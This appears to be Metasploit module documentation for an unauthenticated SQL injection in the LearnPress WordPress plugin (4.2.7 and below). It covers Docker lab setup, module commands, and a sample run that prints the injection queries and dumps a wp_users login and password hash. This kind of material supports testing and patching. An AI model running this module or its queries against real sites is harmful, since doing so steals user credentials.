## Vulnerable Application

The vulnerability affects the **LearnPress** plugin, version **4.2.7** and below,
allowing unauthenticated SQL injection via the `c_only_fields` and `c_fields` parameters.

### Pre-requisites:
- **Docker** and **Docker Compose** installed on your system.

### Setup Instructions:

1. **Download the Docker Compose file**:
   - Below is the content of the **docker-compose.yml** file to set up WordPress with the vulnerable LearnPress plugin and a MySQL database.

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 512m
    volumes:
      - wordpress:/var/www/html
      - ./custom.ini:/usr/local/etc/php/conf.d/custom.ini

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

2. **Add custom PHP configuration** (for plugin uploads):
   - Create a file named `custom.ini` in the same directory as `docker-compose.yml` with the following content:

```bash
upload_max_filesize = 64M
post_max_size = 64M
```

This increases the file size limits for uploading the LearnPress plugin.

3. **Start the Docker environment**:
   - In the directory where you saved the `docker-compose.yml` file, run the following command to start the services:

```bash
docker-compose up -d
```

4. **Install LearnPress Plugin**:
   - Download the vulnerable version of LearnPress:

```bash
wget https://downloads.wordpress.org/plugin/learnpress.4.2.7.zip
```

   - Install the plugin in your running WordPress instance:
     - Extract the plugin files and copy them to your WordPress container:

```bash
unzip learnpress.4.2.7.zip
docker cp learnpress wordpress:/var/www/html/wp-content/plugins/
```

   - Navigate to `http://localhost:5555/wp-admin` in your browser and activate the **LearnPress** plugin in the WordPress admin panel.

## Verification Steps

1. **Set up WordPress** with the vulnerable **LearnPress 4.2.7** plugin.
2. **Start Metasploit** using the command `msfconsole`.
3. Use the correct module for the vulnerability:

```bash
use auxiliary/scanner/http/wp_learnpress_c_fields_sqli
```

4. Set the target's IP and URI:

```bash
set RHOSTS <target_ip>
set TARGETURI /
```

5. **Run the module**:

```bash
run
```

6. **Verify the SQL Injection**:
   - After running the module, the SQL injection payload will attempt to retrieve or manipulate data from the WordPress database.

## Options

### COUNT
This option specifies the number of rows to retrieve from the database during the SQL injection attack.
For example, setting `COUNT` to 5 will retrieve 5 rows from the `wp_users` table.

## Scenarios

The following scenario demonstrates an SQL injection attack against a WordPress installation running
**LearnPress <= 4.2.7** on a Docker environment with MySQL.

### Step-by-step Scenario

```bash
msf6 auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > run http://127.0.0.1:5555

[*] Performing SQL injection via the 'c_only_fields' parameter...
[*] {SQLi} Executing (select group_concat(LKzEL) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) LKzEL from wp_users limit 1) ssrDlly)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] Dumped user data:
wp_users
========

    user_login  user_pass
    ----------  ---------
    chocapikk   $P$BPdY0XccQT2nvSXE8bjsn1CERoF7eJ.

[+] Loot saved to: /home/chocapikk/.msf4/loot/20240920003917_default_127.0.0.1_wordpress.users_803563.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > set action CVE-2024-8529
action => CVE-2024-8529
msf6 auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > run http://127.0.0.1:5555

[*] Performing SQL injection via the 'c_fields' parameter...
[*] {SQLi} Executing (select group_concat(hhtd) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) hhtd from wp_users limit 1) mqRlJXbdH)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] Dumped user data:
wp_users
========

    user_login  user_pass
    ----------  ---------
    chocapikk   $P$BPdY0XccQT2nvSXE8bjsn1CERoF7eJ.

[+] Loot saved to: /home/chocapikk/.msf4/loot/20240920004105_default_127.0.0.1_wordpress.users_099358.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
